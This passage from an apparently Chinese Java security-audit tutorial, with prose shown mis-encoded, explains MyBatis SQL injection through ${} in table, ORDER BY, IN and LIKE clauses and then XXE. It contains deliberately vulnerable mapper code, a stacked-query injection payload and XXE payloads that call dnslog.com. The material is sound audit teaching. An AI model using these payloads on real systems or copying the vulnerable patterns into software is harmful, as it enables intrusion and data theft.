org.apache.ibatis.session.SqlSessionFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSessionFactoryBuilder;</span><br><span class="line"></span><br><span class="line">publicclassMain&#123;</span><br><span class="line">    publicstaticvoidmain(String[] args)&#123;</span><br><span class="line">        SqlSessionFactorysqlSessionFactory= newSqlSessionFactoryBuilder().build(Resources.getResourceAsStream(<span class="string">&quot;mybatis-config.xml&quot;</span>));</span><br><span class="line">        <span class="keyword">try</span>(SqlSessionsession= sqlSessionFactory.openSession())&#123;</span><br><span class="line">            UserMapperuserMapper= session.getMapper(UserMapper.class);</span><br><span class="line">            Useruser= userMapper.getUserById(<span class="number">1</span>);</span><br><span class="line">            System.out.println(user);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="MyBatisä¸­-å’Œ-åŒºåˆ«"><code>MyBatis</code>ä¸­#{}å’Œ${}åŒºåˆ«</h4><p>åœ¨<code>Mybatis</code>ä¸­æ‹¼æ¥<code>SQL</code>è¯­å¥æœ‰ä¸¤ç§æ–¹å¼ï¼šä¸€ç§æ˜¯å ä½ç¬¦ <code>#&#123;&#125;</code> ï¼Œå¦ä¸€ç§æ˜¯æ‹¼æ¥ç¬¦<code>$&#123;&#125;</code> ã€‚</p><h5 id="å¯¹äº-ï¼š">å¯¹äº<code>#&#123;&#125;</code>ï¼š</h5><p><code>#&#123;&#125;</code> å ä½ç¬¦ç”¨äº<strong>é¢„ç¼–è¯‘å‚æ•°ç»‘å®š</strong>ï¼Œ<code>MyBatis</code>ä¼šæŠŠ <code>#&#123;&#125;</code> ä¸­çš„å€¼<strong>ä½œä¸ºå‚æ•°</strong>ä¼ é€’ç»™æ•°æ®åº“æŸ¥è¯¢æˆ–æ›´æ–°è¯­å¥ï¼Œåœ¨æ‰§è¡Œ <code>SQL</code>æ—¶ç”±æ•°æ®åº“é©±åŠ¨è¿›è¡Œå¤„ç†ã€‚è¿™æ ·åšçš„å¥½å¤„æ˜¯ï¼Œ<strong>å‚æ•°ä¼šè¢«è§†ä¸ºæ•°æ®ï¼Œè¿›è¡Œè½¬ä¹‰å’Œé¢„ç¼–è¯‘</strong>ï¼Œä¸ä¼šç›´æ¥æ‹¼æ¥åˆ°<code>SQL</code>è¯­å¥ä¸­ï¼Œé˜²æ­¢äº†<code>SQL</code>æ³¨å…¥æ”»å‡»ã€‚</p><ul><li><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong> <code>#&#123;&#125;</code> é€‚ç”¨äºæ‰€æœ‰æƒ…å†µï¼Œå°¤å…¶æ˜¯å¯¹äºåŠ¨æ€æ¡ä»¶ã€æŸ¥è¯¢å‚æ•°ç­‰ã€‚æ¯”å¦‚æŸ¥è¯¢æ¡ä»¶ã€æ›´æ–°å€¼ç­‰ã€‚</li></ul><p>ç¤ºä¾‹ï¼š</p><p>æŸ¥è¯¢çš„<code>xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span>Â <span class="attr">id</span>=<span class="string">&quot;getUserById&quot;</span>Â <span class="attr">resultType</span>=<span class="string">&quot;com.example.User&quot;</span>&gt;</span></span><br><span class="line">Â Â Â Â SELECTÂ *Â FROMÂ usersÂ WHEREÂ idÂ =Â #&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¯¹åº”çš„<code>Java</code>ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">User</span>Â <span class="variable">user</span>Â <span class="operator">=</span>Â userMapper.getUserById(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>å“ªä¹ˆæœ€ååœ¨æ‰§è¡Œæ—¶ï¼Œ<code>MyBatis</code> ä¼šå°† <code>id</code> çš„å€¼ 1 ç»‘å®šåˆ° <code>SQL</code> æŸ¥è¯¢ä¸­ï¼Œç”Ÿæˆçš„<code>SQL</code>è¯­å¥ä¼šæ˜¯ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>Â <span class="operator">*</span>Â <span class="keyword">FROM</span>Â usersÂ <span class="keyword">WHERE</span>Â idÂ <span class="operator">=</span>Â ?</span><br></pre></td></tr></table></figure><p>å¦‚æœä¼ å…¥çš„æ•°å€¼ä¸º1ï¼Œé‚£ä¹ˆæœ€ç»ˆä¼šè¢«è§£ææˆ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>Â <span class="operator">*</span>Â <span class="keyword">FROM</span>Â usersÂ <span class="keyword">WHERE</span>Â idÂ <span class="operator">=</span>Â &quot;1&quot;</span><br></pre></td></tr></table></figure><h5 id="å¯¹äº">å¯¹äº<code>$&#123;&#125;</code>:</h5><p><code>$&#123;&#125;</code> ç”¨äº<strong>ç›´æ¥æ‹¼æ¥å­—ç¬¦ä¸²</strong>ã€‚<code>MyBatis</code> åœ¨è§£æ <code>SQL</code> æ—¶ï¼Œ<code>$&#123;&#125;</code> ä¸ä¼šå¯¹ä¼ å…¥çš„å‚æ•°ä¸åšå¤„ç†ï¼Œè€Œæ˜¯ç›´æ¥æ‹¼æ¥ï¼Œ<code>MyBatis</code>ä¼šæŠŠ <code>$&#123;&#125;</code> ä¸­çš„å†…å®¹ç›´æ¥æ›¿æ¢ä¸ºå¯¹åº”çš„å‚æ•°å€¼ï¼Œè€Œ<strong>ä¸è¿›è¡Œä»»ä½•è½¬ä¹‰æˆ–é¢„å¤„ç†</strong>ï¼Œè¿›è€Œä¼šé€ æˆ<code>SQL</code>æ³¨å…¥æ¼æ´ã€‚</p><ul><li><strong>ä½¿ç”¨åœºæ™¯</strong>ï¼š<code>$&#123;&#125;</code> ä¸€èˆ¬ç”¨äºåŠ¨æ€è¡¨åã€åˆ—åã€æ’åºå­—æ®µç­‰åœºæ™¯ï¼Œé€šå¸¸æƒ…å†µä¸‹ä¸åº”å°†ç”¨æˆ·è¾“å…¥çš„å‚æ•°ç›´æ¥ä¼ å…¥ <code>$&#123;&#125;</code> ä¸­ï¼Œä»¥é˜²æ­¢<code>SQL</code>æ³¨å…¥ã€‚</li></ul><h4 id="å­˜åœ¨SQLæ³¨å…¥æ¼æ´çš„">å­˜åœ¨<code>SQL</code>æ³¨å…¥æ¼æ´çš„<code>$&#123;&#125;</code></h4><p>å‡è®¾æˆ‘ä»¬å…è®¸ç”¨æˆ·é€šè¿‡è¾“å…¥æ ‡åæŸ¥è¯¢æ•°æ®ï¼Œå¹¶ä¸”ç›´æ¥ç”¨<code>$&#123;&#125;</code>æ¥æ‹¼æ¥<code>SQL</code>ï¼š</p><p><code>Mapper XML</code>æ–‡ä»¶ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span>Â <span class="attr">id</span>=<span class="string">&quot;findByTable&quot;</span>Â <span class="attr">resultType</span>=<span class="string">&quot;com.example.User&quot;</span>&gt;</span></span><br><span class="line">Â Â Â Â SELECTÂ *Â FROMÂ $&#123;tableName&#125;Â WHEREÂ idÂ =Â #&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„<code>tableName</code>ä¸º<code>SQL</code>è¯­å¥çš„ä¸€éƒ¨åˆ†ï¼Œç›´æ¥æ‹¼æ¥å¯å¯¼è‡´<code>SQL</code>æ³¨å…¥é—®é¢˜ã€‚å‡è®¾æ³¨å…¥çš„æ•°æ®ä¸º<code>users;select database();-- -</code>ï¼ŒæŸ¥è¯¢æ•°æ®åº“çš„åç§°ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users;<span class="keyword">select</span> database();<span class="comment">-- -where id = ?</span></span><br></pre></td></tr></table></figure><p><strong>ä¸å­˜åœ¨<code>SQL</code>æ³¨å…¥çš„<code>$&#123;&#125;</code>ç”¨æ³•</strong></p><p><code>Mapper XML</code>æ–‡ä»¶</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span>Â <span class="attr">id</span>=<span class="string">&quot;findByColumn&quot;</span>Â <span class="attr">resultType</span>=<span class="string">&quot;com.example.User&quot;</span>&gt;</span></span><br><span class="line">Â Â Â Â SELECTÂ *Â FROMÂ usersÂ WHEREÂ $&#123;column&#125;Â =Â #&#123;value&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¯¹åº”çš„<code>Java</code>ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span>Â <span class="variable">column</span>Â <span class="operator">=</span>Â <span class="string">&quot;age&quot;</span>; <span class="comment">//ç”¨æˆ·ä¸å¯æ§</span></span><br><span class="line"><span class="type">int</span>Â <span class="variable">value</span>Â <span class="operator">=</span>Â <span class="number">25</span>; <span class="comment">//ç”¨æˆ·å¯æ§</span></span><br><span class="line">List&lt;User&gt;Â usersÂ =Â userMapper.findByColumn(column,Â value);</span><br></pre></td></tr></table></figure><p>æœ€ååœ¨æ‰§è¡Œæ—¶ï¼Œ<code>MyBatis</code> ä¼šå°† <code>$&#123;column&#125;</code> æ›¿æ¢æˆ <code>age</code>ï¼Œè€Œ <code>#&#123;value&#125;</code> ä»ç„¶ä¼šç”¨ <code>25</code> ä½œä¸ºå‚æ•°ç»‘å®šã€‚æœ€ç»ˆç”Ÿæˆçš„ SQL è¯­å¥ä¸ºï¼š</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>Â <span class="operator">*</span>Â <span class="keyword">FROM</span>Â usersÂ <span class="keyword">WHERE</span>Â ageÂ <span class="operator">=</span> ?</span><br></pre></td></tr></table></figure><p>æ€»ä¹‹ï¼Œé˜²æ­¢<code>SQL</code>æ³¨å…¥çš„å…³é”®ç‚¹æ˜¯ï¼Œä½œä¸º<code>SQL</code>è¯­å¥ä¸­çš„**å­—æ®µéƒ¨åˆ†(ä¸ºSQLè¯­å¥çš„ä¸€éƒ¨åˆ†,ä¸ä½¿ç”¨é¢„ç¼–è¯‘)**ä¸æ˜¯ç”¨æˆ·å¯ä»¥ä»»æ„æ§åˆ¶çš„ï¼Œè¿™æ ·å°±å¯ä»¥æœ‰æ•ˆçš„é˜²æ­¢<code>SQL</code>æ³¨å…¥äº†ã€‚ä¾‹å¦‚ï¼Œä¸Šè¿°çš„æ¡ˆä¾‹ä¸­<code>age</code>æ˜¯å†™æ­»çš„æˆ–è€…å†™ä¸€ä¸ªç™½åå•æ•°ç»„ï¼Œåªå…è®¸ä¼ å…¥ç™½åå•æ•°ç»„å†…çš„å†…å®¹ï¼Œè¿™æ ·ç”¨æˆ·ä¸å¯ä»»æ„æ§åˆ¶äº†ä¹Ÿå°±é˜²æ­¢äº†<code>SQL</code>æ³¨å…¥ã€‚</p><h3 id="ORDER-BYæ³¨å…¥"><code>ORDER BY</code>æ³¨å…¥</h3><p><code>ORDER BY</code>è¯­å¥ ï¼šç”¨äºå¯¹æŸ¥è¯¢ç»“æœçš„æ’åºï¼Œ<code>asc</code>ä¸ºå‡åºï¼Œ<code>desc</code>ä¸ºé™åºã€‚é»˜è®¤ä¸ºå‡åºã€‚</p><p>æ¯”å¦‚ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>Â <span class="operator">*</span>Â <span class="keyword">from</span>Â usersÂ <span class="keyword">order</span>Â <span class="keyword">by</span>Â usernameÂ <span class="keyword">asc</span>;</span><br></pre></td></tr></table></figure><p><code>JDBC</code>ä¸­çš„<code>ORDER BY</code>æ³¨å…¥é—®é¢˜ï¼Œå‰é¢å·²ç»è¯´è¿‡äº†ã€‚</p><p>ä¸<code>JDBC</code>é¢„ç¼–è¯‘ä¸­<code>ORDER BY</code>æ³¨å…¥ä¸€æ ·ï¼Œåœ¨<code>ORDER BY</code>è¯­å¥åé¢éœ€è¦æ˜¯å­—æ®µåæˆ–è€…å­—æ®µä½ç½®ã€‚å› æ­¤ä¹Ÿä¸èƒ½ä½¿ç”¨<code>Mybatis</code>ä¸­é¢„ç¼–è¯‘çš„æ–¹å¼ã€‚</p><p>å­˜åœ¨æ³¨å…¥çš„<code>ORDER BY</code>æŸ¥è¯¢ï¼Œå¦‚ä¸‹<code>UserMapper.xml</code>ï¼Œè¿™é‡Œçš„<code>sort</code>è¦å¯æ§ä¸ºä»»æ„å­—ç¬¦ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;orderbysqli&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;String&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">  select * from users order by $&#123;sort&#125; asc </span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>Java</code>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/mybatis/orderby&quot;)</span></span><br><span class="line"><span class="keyword">public</span> List&lt;User&gt; <span class="title function_">orderbySql</span><span class="params">(<span class="meta">@RequestParam(&quot;sort&quot;)</span> String sort)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> userMapper.orderbysqli(sort);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="INæ³¨å…¥"><code>IN</code>æ³¨å…¥</h3><p><code>IN</code>è¯­å¥ï¼šå¸¸ç”¨äº<code>where</code>è¡¨è¾¾å¼ä¸­ï¼Œå…¶ä½œç”¨æ˜¯æŸ¥è¯¢æŸä¸ªèŒƒå›´å†…çš„æ•°æ®ã€‚</p><p>æ¯”å¦‚ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â <span class="keyword">select</span>Â <span class="operator">*</span>Â <span class="keyword">from</span>Â <span class="keyword">where</span>Â fieldÂ <span class="keyword">in</span>Â (value1,value2,value3,â€¦);Â </span><br></pre></td></tr></table></figure><p>å¦‚ä¸Šæ‰€ç¤ºï¼Œ<code>IN</code>åœ¨æŸ¥è¯¢æŸä¸ªèŒƒå›´æ•°æ®æ˜¯ä¼šç”¨åˆ°å¤šä¸ªå‚æ•°ï¼Œåœ¨<code>Mybtis</code>ä¸­å¦‚æœç›´æ¥ä½¿ç”¨å ä½ç¬¦ <code>#&#123;&#125;</code>è¿›è¡ŒæŸ¥è¯¢ä¼šå°†è¿™äº›å‚æ•°çœ‹åšä¸€ä¸ªæ•´ä½“ï¼Œ<strong>æŸ¥è¯¢ä¼šæŠ¥é”™</strong>ã€‚ å› æ­¤å¾ˆå¤šå¼€å‘äººå‘˜å¯èƒ½ä¼šä½¿ç”¨æ‹¼æ¥ç¬¦<code>$&#123;&#125;</code>å¯¹å‚æ•°è¿›è¡ŒæŸ¥è¯¢ï¼Œä»è€Œé€ æˆäº†SQLæ³¨å…¥æ¼æ´ã€‚</p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â <span class="keyword">select</span>Â <span class="operator">*</span>Â <span class="keyword">from</span>Â usersÂ <span class="keyword">where</span>Â idÂ <span class="keyword">in</span>Â ($&#123;params&#125;)Â </span><br></pre></td></tr></table></figure><p>æ­£ç¡®çš„åšæ³•æ˜¯éœ€è¦ä½¿ç”¨<code>foreach</code>é…åˆå ä½ç¬¦ <code>#&#123;&#125;</code> å®ç°<code>IN</code>æŸ¥è¯¢ã€‚æ¯”å¦‚ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--Â whereÂ inÂ æŸ¥è¯¢åœºæ™¯Â --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span>Â <span class="attr">id</span>=<span class="string">&quot;findUsers&quot;</span>Â <span class="attr">resultType</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">Â Â Â Â SELECTÂ *Â FROMÂ usersÂ WHEREÂ idÂ INÂ </span><br><span class="line">Â Â Â Â <span class="tag">&lt;<span class="name">foreach</span>Â <span class="attr">item</span>=<span class="string">&quot;id&quot;</span>Â <span class="attr">collection</span>=<span class="string">&quot;ids&quot;</span>Â <span class="attr">open</span>=<span class="string">&quot;(&quot;</span>Â <span class="attr">separator</span>=<span class="string">&quot;,&quot;</span>Â <span class="attr">close</span>=<span class="string">&quot;)&quot;</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â #&#123;id&#125;</span><br><span class="line">Â Â Â Â <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å­˜åœ¨<code>SQL</code>æ³¨å…¥æ¼æ´çš„ä»£ç ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span>Â <span class="attr">id</span>=<span class="string">&quot;findUsers&quot;</span>Â <span class="attr">resultType</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">Â Â Â Â SELECTÂ *Â FROMÂ usersÂ WHEREÂ idÂ INÂ ($&#123;ids&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¯¹åº”çš„<code>Java</code>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/mybatis/injection&quot;)</span></span><br><span class="line">publicList&lt;User&gt;INuser(<span class="meta">@RequestParam(&quot;id&quot;)</span>Â StringÂ id)&#123;</span><br><span class="line">  <span class="keyword">return</span>Â userMapper.INuser(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="LIKEæ³¨å…¥"><code>LIKE</code>æ³¨å…¥</h3><p><code>LIKE</code> å­å¥ç”¨äºåœ¨<code> SQL</code> æŸ¥è¯¢ä¸­è¿›è¡Œæ¨¡ç³ŠåŒ¹é…ã€‚å½“ä½¿ç”¨ç”¨æˆ·è¾“å…¥çš„å†…å®¹ä½œä¸º <code>LIKE</code> æ¡ä»¶æ—¶ï¼Œåº”è¯¥éå¸¸å°å¿ƒï¼Œå› ä¸ºæ¶æ„è¾“å…¥å¯èƒ½å¯¼è‡´<code>SQL</code>æ³¨å…¥ã€‚ä½¿ç”¨<code>LIKE</code>è¯­å¥è¿›è¡ŒæŸ¥è¯¢æ—¶å¦‚æœä½¿ç”¨å ä½ç¬¦<code>#&#123;&#125;</code>æŸ¥è¯¢æ—¶ç¨‹åºä¼šæŠ¥é”™ã€‚</p><p>å› æ­¤ç»éªŒä¸è¶³çš„å¼€å‘äººå‘˜å¯èƒ½ä¼šç›´æ¥ä½¿ç”¨æ‹¼æ¥ç¬¦ <code>$&#123;&#125; </code>å¯¹å‚æ•°è¿›è¡ŒæŸ¥è¯¢ï¼Œä»è€Œé€ æˆäº†SQLæ³¨å…¥æ¼æ´ã€‚</p><p>è¿™é‡Œ<code>username</code>ä»»æ„å¯æ§ï¼Œå­˜åœ¨<code>SQL</code>æ³¨å…¥çš„ä»£ç ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span>Â <span class="attr">id</span>=<span class="string">&quot;like2&quot;</span>Â <span class="attr">parameterType</span>=<span class="string">&quot;String&quot;</span>Â <span class="attr">resultMap</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">Â Â Â Â Â Â Â Â selectÂ *Â fromÂ usersÂ whereÂ usernameÂ likeÂ &#x27;%$&#123;username&#125;%&#x27;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ­£ç¡®çš„ç”¨æ³•ï¼Œä¸å­˜åœ¨<code>SQL</code>æ³¨å…¥æ¼æ´ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span>Â <span class="attr">id</span>=<span class="string">&quot;getUserListLikeConcat&quot;</span>Â <span class="attr">resultType</span>=<span class="string">&quot;org.example.User&quot;</span>&gt;</span></span><br><span class="line">Â Â Â Â SELECTÂ *Â FROMÂ userÂ WHEREÂ nameÂ LIKEÂ concatÂ (&#x27;%&#x27;,Â #&#123;name&#125;,Â &#x27;%&#x27;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserListLike&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;org.example.User&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">bind</span> <span class="attr">name</span>=<span class="string">&quot;pattern&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#x27;%&#x27; + name + &#x27;%&#x27;&quot;</span> /&gt;</span></span><br><span class="line">  SELECT * FROM user </span><br><span class="line">  WHERE name LIKE #&#123;pattern&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="SQLç›¸å…³å‡½æ•°ç‚¹"><code>SQL</code>ç›¸å…³å‡½æ•°ç‚¹</h3><p>çœ‹äº†å‰é¢çš„å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œä»£ç å­˜åœ¨<code>SQL</code>æ³¨å…¥ï¼Œå…¶å®æœ¬è´¨å°±æ˜¯å°†ç”¨æˆ·çš„è¾“å…¥å½“ä½œäº†<code>SQL</code>è¯­å¥çš„å­—æ®µå†…å®¹å»æ‰§è¡Œäº†ã€‚æƒ³è¦å‘ç°<code>SQL</code>æ³¨å…¥æ¼æ´ï¼Œå°±è¦æ³¨æ„åœ¨ä»£ç ä¸­è¿›è¡Œ<code>SQL</code>è¯­å¥æ“ä½œçš„ä½ç½®ç‚¹ï¼Œä»”ç»†æŸ¥çœ‹ä»£ç æ˜¯å¦æ­£å¸¸ä½¿ç”¨é¢„ç¼–è¯‘æˆ–è€…æ˜¯å¦è¿‡æ»¤å®Œå…¨ã€‚</p><p>ä¸‹é¢ç»™å‡ºäº†æ¶‰åŠ<code>SQL</code>è¯­å¥æ“ä½œçš„è¯è¯­ï¼Œé€šè¿‡è¿™äº›è¯å¯ä»¥å¿«é€Ÿå®šä½ä»£ç ä¸­çš„æ“ä½œ<code>SQL</code>çš„å†…å®¹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Statement</span><br><span class="line">createStatement</span><br><span class="line">PrepareStatement</span><br><span class="line">likeÂ <span class="string">&#x27;%$&#123;</span></span><br><span class="line"><span class="string">in($&#123;</span></span><br><span class="line"><span class="string">inÂ ($&#123;</span></span><br><span class="line"><span class="string">select</span></span><br><span class="line"><span class="string">update</span></span><br><span class="line"><span class="string">insert</span></span><br><span class="line"><span class="string">delete</span></span><br><span class="line"><span class="string">$&#123;</span></span><br><span class="line"><span class="string">setObject(</span></span><br><span class="line"><span class="string">setInt(</span></span><br><span class="line"><span class="string">setString(</span></span><br><span class="line"><span class="string">setSQLXML(</span></span><br><span class="line"><span class="string">createQuery(</span></span><br><span class="line"><span class="string">createSQLQuery(</span></span><br><span class="line"><span class="string">createNativeQuery(</span></span><br></pre></td></tr></table></figure><h2 id="XXE">XXE</h2><p>å¸¸è§çš„<code>XXE</code>çš„<code>payload</code>å¦‚ä¸‹ï¼š</p><p>æµ‹è¯•å›æ˜¾çš„<code>XXE</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE x [ <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://dnslog.com/&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ— å›æ˜¾<code>XXE</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [<span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;https://dnslog.com&quot;</span>&gt;</span> %xxe;]&gt;</span></span><br></pre></td></tr></table></figure><h3 id="æ¼æ´ç›¸å…³åº“">æ¼æ´ç›¸å…³åº“</h3><p>å¸¸è§çš„å¯èƒ½å­˜åœ¨<code>XXE</code>çš„ç›¸å…³åŒ…<sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.parsers.DocumentBuilder</span><br><span class="line">javax.xml.parsers.SAXParser</span><br><span class="line">javax.xml.parsers.SAXParserFactory</span><br><span class="line">javax.xml.transform.TransformerFactory</span><br><span class="line">javax.xml.validation.Validator</span><br><span class="line">javax.xml.validation.SchemaFactory</span><br><span class="line">javax.xml.transform.sax.SAXTransformerFactory</span><br><span class="line">javax.xml.transform.sax.SAXSource</span><br><span class="line">org.xml.sax.XMLReader</span><br><span class="line">org.xml.sax.helpers.XMLReaderFactory</span><br><span class="line">org.dom4j.io.SAXReader</span><br><span class="line">org.jdom.input.SAXBuilder</span><br><span class="line">org.jdom2.input.SAXBuilder</span><br><span class="line">javax.xml.bind.Unmarshaller</span><br><span class="line">javax.xml.xpath.XpathExpression</span><br><span class="line">javax.xml.stream.XMLStreamReader</span><br><span class="line">org.apache.commons.digester3.Digester</span><br></pre></td></tr></table></figure><h3 id="æµ‹è¯•å®ä¾‹">æµ‹è¯•å®ä¾‹</h3><h4 id="org-xml-sax-XMLReader">org.xml.sax.XMLReader</h4><p>å­˜åœ¨<code>XXE</code>æ¼æ´çš„æƒ…å†µã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 